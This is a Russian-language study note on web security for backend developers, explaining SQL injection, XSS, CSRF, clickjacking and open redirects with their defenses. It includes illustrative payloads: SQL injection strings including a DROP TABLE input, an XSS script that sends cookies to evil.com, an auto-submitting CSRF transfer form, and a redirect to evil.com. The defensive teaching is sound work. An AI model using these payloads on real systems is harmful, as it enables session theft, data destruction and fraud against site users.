# Веб-безопасность

> _Любой ввод от пользователя — потенциально враждебный, пока не доказано обратное_

---

Веб-приложение общается с внешним миром через HTTP: принимает данные от кого угодно. Большинство уязвимостей — это когда **чужой ввод исполняется как код**: как SQL в базе, как HTML/JS в браузере, как действие от чужого имени. Здесь — три главные атаки, которые спросят на собеседовании (XSS, CSRF, SQL-инъекция), и как от них защищаются в бэкенде. Про хеширование паролей и шифрование — в Криптография и безопасность, про токены — в [Разделение доступа в DRF](Фреймворки/DJANGO/Разделение%20доступа%20в%20DRF.md) и [Oauth 2.0](Библиотеки/Сторонние/Работа%20с%20WEB/Oauth%202.0.md).

Общий принцип под всеми защитами: **разделять данные и код**. Ввод должен оставаться данными и никогда не попадать в исполняемый контекст напрямую.

## SQL-инъекция

**SQL-инъекция** — злоумышленник вставляет свой SQL в поле ввода, и он исполняется базой. Причина — сборка запроса **склейкой строк** с пользовательским вводом.

```python
# УЯЗВИМО — ввод склеивается в текст запроса
login = request.get("login")            # пользователь ввёл:  ' OR '1'='1
cursor.execute(f"SELECT * FROM users WHERE login = '{login}'")
# итоговый запрос: SELECT * FROM users WHERE login = '' OR '1'='1'  → вернёт всех
# ввод  '; DROP TABLE users; --  может и удалить таблицу
```

**Защита — параметризованные (подготовленные) запросы.** Значения передают **отдельно** от текста запроса; драйвер сам их экранирует, и ввод физически не может стать SQL.

```python
# БЕЗОПАСНО — плейсхолдеры, значения отдельным аргументом
cursor.execute("SELECT * FROM users WHERE login = %s", (login,))   # psycopg2
cursor.execute("SELECT * FROM users WHERE login = ?", (login,))    # sqlite3
```

- **ORM защищает по умолчанию.** [Django ORM](Фреймворки/DJANGO/ORM%20Django.md) и [SQLAlchemy](Библиотеки/Сторонние/ORM/SQLAlchemy.md) всегда параметризуют запросы — `User.objects.filter(login=login)` безопасен. Опасность возвращается при **сыром** SQL: `raw()`/`execute()` со склейкой строк. Используешь сырой SQL — только с плейсхолдерами.
- **Никогда** не собирай SQL через f-строки/`format`/`%` с пользовательским вводом.

> `%s` в `cursor.execute(...)` — **не** форматирование строки Python. Это плейсхолдер драйвера БД: передавай значения вторым аргументом, а не через `%`/`f""`.

**Почему это безопасно — два этапа.** База обрабатывает параметризованный запрос в два шага: сначала разбирает и компилирует **сам SQL без значений**, затем подставляет параметры как **чистые данные**. Значение уже не может стать частью команды, даже если внутри кавычки, операторы или `'; DROP TABLE users; --`. Бонус: скомпилированный план переиспользуется — быстрее при повторных запросах.

**Где параметризация не спасает:**

- **Имена таблиц и колонок** плейсхолдером не передать — только значения. Если имя приходит извне, сверяй его с белым списком, а не подставляй в текст запроса.
- **`LIKE`** — спецсимволы `%` и `_` во вводе останутся шаблоном поиска; их экранируют отдельно.
- **`IN (...)`** — один плейсхолдер = одно значение; под список делают по плейсхолдеру на элемент (`IN (%s, %s, %s)`), а не склеивают массив в строку.

## XSS (Cross-Site Scripting)

**XSS** — злоумышленник внедряет свой **JavaScript** на страницу, и он исполняется в браузере **другого** пользователя: крадёт куки/сессию, действует от его имени.

```python
# УЯЗВИМО — ввод попадает в HTML как есть
комментарий = "<script>fetch('https://evil.com?c='+document.cookie)</script>"
# если вывести его в шаблон без экранирования — скрипт выполнится у всех, кто открыл страницу
```

Виды: **stored** (сохранён в БД, бьёт по всем — комментарии), **reflected** (в параметре URL, бьёт по жертве по ссылке), **DOM-based** (JS на клиенте вставляет ввод в DOM).

**Защита — экранировать вывод по контексту:**

- **Автоэкранирование в шаблонах.** [Django](Фреймворки/DJANGO/Django.md)-шаблоны экранируют `<`, `>`, `&`, `"` в `{{ переменная }}` **по умолчанию** — `<script>` превращается в безопасный текст. Дыра открывается, когда его отключают: `|safe`, `mark_safe`, `{% autoescape off %}` на пользовательском вводе — так нельзя.
- **API отдаёт JSON, а не HTML** — [FastAPI](Фреймворки/FastAPI.md)/DRF по умолчанию не рендерят HTML, поверхность XSS меньше; но данные всё равно экранирует уже фронтенд при вставке в DOM.
- **Content-Security-Policy (CSP)** — заголовок, запрещающий выполнять сторонние/инлайновые скрипты: второй рубеж, если экранирование пропущено.
- **HttpOnly-куки** — недоступны из JS, поэтому украденный XSS-скриптом `document.cookie` не отдаст сессию.

## CSRF (Cross-Site Request Forgery)

**CSRF** — чужой сайт заставляет **браузер жертвы** отправить запрос на твой сайт, используя её **уже залогиненную** сессию. Браузер сам прикладывает куки к запросу — и сервер думает, что действие совершил сам пользователь.

```html
<!-- на evil.com; если жертва залогинена на bank.com, перевод уйдёт от её имени -->
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker"><input name="sum" value="10000">
</form>
<script>document.forms[0].submit()</script>
```

**Защита:**

- **CSRF-токен** — сервер кладёт в форму секретный токен, привязанный к сессии; при отправке проверяет его. Чужой сайт токен не знает. В [Django](Фреймворки/DJANGO/Django.md) это `CsrfViewMiddleware` + `{% csrf_token %}` в форме — включено по умолчанию.
- **SameSite-куки** — `SameSite=Lax/Strict`: браузер не шлёт куку в запросах с чужого сайта. Современный второй рубеж; механика всех трёх значений — SameSite.
- **API с токеном в заголовке не подвержены классическому CSRF.** Если аутентификация — не по куке, а по `Authorization: Bearer <JWT>` ([JWT](Фреймворки/DJANGO/Разделение%20доступа%20в%20DRF.md)), браузер не прикладывает токен автоматически, и подделать запрос с чужого сайта нельзя. Поэтому stateless-API на JWT обычно CSRF-защиту не включают (а вот cookie-сессии — обязательно).

## XSS vs CSRF — не путать

| | XSS | CSRF |
|---|---|---|
| Что исполняется | **чужой JS** в браузере жертвы | **легитимный запрос** от имени жертвы |
| Что эксплуатирует | доверие браузера к сайту (его коду) | доверие сайта к куке браузера |
| Главная защита | экранировать вывод (+ CSP) | CSRF-токен (+ SameSite) |
| Нужна ли сессия жертвы | нет (крадёт её) | да (использует активную) |

> ⚠️ **`SameSite` не отменяет CSRF-токен.** Встречается мнение, что с появлением `SameSite` токены стали не нужны. OWASP держится противоположной позиции: атрибут действует на уровне **регистрируемого домена, а не источника**, поэтому захваченный поддомен его обходит; а умолчание `Lax` пропускает `GET` — и эндпоинт, меняющий состояние по `GET`, остаётся уязвимым. Рекомендация — токен как основная защита, `SameSite` как второй рубеж.

## Кликджекинг

**Кликджекинг** (clickjacking, «угон клика») — атакующий встраивает твой сайт в `<iframe>` на своей странице, растягивает на весь экран и накрывает прозрачным слоем. Пользователь видит настоящий интерфейс, но его клики попадают либо по невидимым элементам поверх, либо по кнопкам твоего сайта, которые он не собирался нажимать.

Работает потому, что жертва **уже залогинена**: действие совершается её сеансом, и с точки зрения сервера всё легитимно.

**Защита — запретить встраивание** заголовком ответа:

```
Content-Security-Policy: frame-ancestors 'none'      # современный способ
X-Frame-Options: DENY                                 # старый, для совместимости
```

`frame-ancestors 'self'` разрешает встраивать только собственным страницам, а список источников — конкретным партнёрам. Ставят обычно на веб-сервере ([nginx](DevOps/nginx.md)) сразу для всех ответов, а не в коде каждого маршрута.

## Открытый редирект

**Открытый редирект** (open redirect) — приложение перенаправляет пользователя по адресу, пришедшему из запроса, без проверки:

```
https://site.com/login?next=/dashboard        ← так задумано
https://site.com/login?next=https://evil.com  ← так это используют
```

Ссылка выглядит доверенной — домен настоящий, — поэтому её охотно применяют в фишинге: жертва входит на настоящем сайте и оказывается на копии, где «повторно» вводит пароль. Хуже, если вместе с редиректом утекают токен или код авторизации в параметрах.

**Защита:** не редиректить по внешнему вводу вовсе, а если нужно — сверять с белым списком либо разрешать **только относительные пути** (начинается с одного `/`, но не с `//` — двойной слэш браузер поймёт как чужой домен).

## Ещё коротко

- **IDOR / контроль доступа** — не отдавай объект только по id из URL: проверяй, что он принадлежит текущему пользователю (иначе `/orders/123` покажет чужой заказ).
- **Секреты** — ключи/пароли не в коде и не в гит; из переменных окружения (`pydantic-settings`). Генерировать токены — [secrets](Библиотеки/Модули/Безопасность%20и%20интернет/secrets.md), не `random`.
- **HTTPS всегда** — иначе куки и токены перехватят ([TLS](Алгоритмы/Иные/HTTPS%20и%20обмен%20ключами%20Диффи%20—%20Хеллмана.md)).
- **Валидация ввода** — [Pydantic](Библиотеки/Сторонние/pydantic.md)/сериализаторы отсекают мусор до бизнес-логики.
- **Хеширование паролей** — bcrypt/argon2, не «сырой» [hashlib](Библиотеки/Модули/Безопасность%20и%20интернет/hashlib.md); подробнее — Криптография и безопасность.
- **Отравление кэша DNS** — атака уровнем ниже приложения: пользователь набирает верный адрес, а попадает на чужой сервер, потому что резолвер закэшировал подделанный ответ. Приложение здесь бессильно, закрывается это DNSSEC — см. Угроза 1: подменённый ответ.

## Связи

- Куки — флаги `Secure`, `HttpOnly`, `SameSite`: чем именно закрывают XSS-кражу сеанса и CSRF;
- Политика одного источника и CORS — почему SOP не мешает CSRF (запрещает чтение ответа, а не отправку запроса);
- Передача файлов по HTTP — загруженный файл как недоверенный ввод;
- Криптография и безопасность — хеширование, шифрование, соль (основа защиты паролей);
- [Разделение доступа в DRF](Фреймворки/DJANGO/Разделение%20доступа%20в%20DRF.md) — аутентификация по JWT (и почему API на токенах не подвержен CSRF);
- [JWT — подпись и проверка токенов](JWT%20—%20подпись%20и%20проверка%20токенов.md) — атаки на сам токен: `alg: none` и путаница HS256/RS256 — тот же принцип «ввод не управляет проверкой»;
- [Oauth 2.0](Библиотеки/Сторонние/Работа%20с%20WEB/Oauth%202.0.md) — делегированный доступ по токену без пароля;
- [ORM Django](Фреймворки/DJANGO/ORM%20Django.md) · [SQLAlchemy](Библиотеки/Сторонние/ORM/SQLAlchemy.md) — параметризация запросов из коробки (защита от SQL-инъекций);
- [Вебхуки (webhooks)](Библиотеки/Сторонние/Работа%20с%20WEB/Вебхуки%20%28webhooks%29.md) — проверка подписи входящих запросов (тоже «не доверяй вводу»);
- [pydantic](Библиотеки/Сторонние/pydantic.md) — валидация входных данных;
- [secrets](Библиотеки/Модули/Безопасность%20и%20интернет/secrets.md) — криптостойкая генерация токенов;
- Защита DNS — DNSSEC, DoH и DoT — угрозы ниже уровня приложения: подмена ответа и чтение запросов.
